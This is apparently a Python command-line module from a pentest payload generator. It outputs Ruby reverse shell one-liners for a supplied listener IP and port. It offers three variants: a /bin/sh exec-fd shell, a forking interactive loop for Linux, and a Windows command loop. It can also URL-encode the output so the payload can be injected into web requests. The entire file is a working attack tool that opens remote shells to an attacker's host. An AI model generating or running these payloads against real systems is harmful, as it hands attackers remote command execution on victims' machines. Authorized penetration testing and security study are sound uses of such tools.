import click
from colorama import Fore
from urllib.parse import quote

@click.command()
@click.argument("listener_ip")
@click.argument("listener_port")
@click.option("-r", "--raw", is_flag=True, default=False, help="Enable raw output.")
@click.option("-u", "--urlencode", is_flag=True, default=False, help="URL-encode the output.")
@click.option("-v", "--variant", default="1", type=click.Choice(["1", "2", "3"]),
              help="1=exec fd (default), 2=interactive loop Linux, 3=Windows")
def command(listener_ip, listener_port, raw, urlencode, variant):
    """Return Ruby reverse shell"""
    if variant == "1":
        label = "Ruby reverse shell"
        cmd = (f"ruby -rsocket -e'f=TCPSocket.open(\"{listener_ip}\",{listener_port}).to_i;"
               f"exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'")
    elif variant == "2":
        label = "Ruby interactive loop (Linux)"
        cmd = (f"ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"{listener_ip}\",\"{listener_port}\");"
               f"loop{{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):"
               f"(IO.popen($_,?r){{|io|c.print io.read}}))rescue c.puts \"failed: #{{$_}}\"}}'")
    else:
        label = "Ruby reverse shell (Windows)"
        cmd = (f"ruby -rsocket -e 'c=TCPSocket.new(\"{listener_ip}\",\"{listener_port}\");"
               f"while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'")
    if urlencode:
        cmd = quote(cmd)
    if not raw:
        click.secho(f"{Fore.LIGHTGREEN_EX}{label}:\n\t{Fore.WHITE}{cmd}")
    else:
        click.secho(cmd, nl=False)
